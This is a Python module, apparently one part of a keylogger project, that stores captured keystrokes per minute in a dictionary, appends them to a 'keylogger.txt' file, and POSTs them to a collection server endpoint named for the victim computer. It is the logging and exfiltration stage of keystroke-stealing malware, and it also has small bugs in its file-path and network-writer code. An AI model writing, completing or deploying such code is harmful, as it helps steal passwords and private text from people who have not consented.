from abc import ABC,abstractmethod
from datetime import datetime
from pathlib import Path
from requests import post

class IWriter(ABC):
    """Abstract class for Interface Writer with write method"""
    @abstractmethod
    def write(self, data) -> None:
        pass

class DictWriter(IWriter):
    """Dictionary writer class with write method
    which get data as list and write it to a dictionary,
    minutes as keys and text as values"""

    def __init__(self):
        self.dct = {}

    def get_dict(self) -> dict:
        """reset the object dictionary and return the last dictionary"""
        current_dict = self.dct.copy()
        self.dct = {}
        return current_dict

    @staticmethod
    def __cur_min():
        """return the current minute as a string"""
        return datetime.now().strftime("%d/%m/%Y, %H:%M")

    def write(self, data: list) -> None:
        """Write the given list of characters to the dictionary."""
        data_str = "".join(data)
        # if self.__cur_min() not in self.dct:
        # print(DictWriter().__cur_min())
        self.dct[self.__cur_min()] = data_str
        # else:
        #     self.dct[self.__cur_min()] += data_str


class FileWriter(IWriter):
    """File writer class with write method
    which get data as string and write it to a text file."""
    def __init__(self, path = None):
        if not path:
            path = self.file_path = Path(path) if path else Path.cwd() / "keylogger.txt"
        self.file_path = path

    def write(self, data: str) -> None:
        with open(self.file_path, "a") as file:
            file.write(data+"\n")


class NetworkWriter(IWriter):
    """Network Writer class with write method
    which get data as string and write it to a server"""
    def __init__(self, data: str):
       self.data = data

    def write(self) -> None:
        post(url="http://127.0.0.1:5000/api/computers/itzcak_sklar", data=self.data)